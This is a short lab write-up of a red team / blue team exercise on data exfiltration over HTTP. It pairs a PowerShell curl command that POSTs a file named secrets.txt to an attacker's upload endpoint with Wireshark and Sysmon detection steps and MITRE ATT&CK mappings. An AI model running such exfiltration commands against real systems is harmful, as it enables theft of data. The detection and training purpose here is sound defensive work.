# ✅ Scenario 2 — Data Exfiltration via HTTP

## 🔴 Red Team Action  
Simulated exfiltration of sensitive data by uploading a file via HTTP POST from the victim:  
```powershell
curl.exe -X POST -F "file=@secrets.txt" http://192.168.2.131:8080/upload.php
```
The attacker (Kali) received the file using a PHP HTTP server with POST handling, and the file appeared on the attacker’s machine.

---

## 🔵 Blue Team Detection (Wireshark)
**Filter Used:**  
```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
```  
Focused on HTTP requests and TLS handshakes while filtering out SSDP noise.  
- Detected abnormal outbound HTTP POST traffic with file uploads.  
- Reconstructed the exfiltrated file from the stream.  
- Sysmon logs (Event ID 1) confirmed `curl.exe` execution with suspicious command-line arguments.

---

## 🧭 MITRE Mapping  
- **T1041 – Exfiltration Over C2 Channel**  
- **T1567 – Exfiltration Over Web Service**  

---

## 📸 Evidence Collected  
- Wireshark capture showing POST request to `/upload.php`.  
- Follow HTTP Stream output confirming file contents.  
- Kali server logs showing `POST /upload.php [200]`.  
- Victim execution of `curl.exe` with suspicious arguments.  
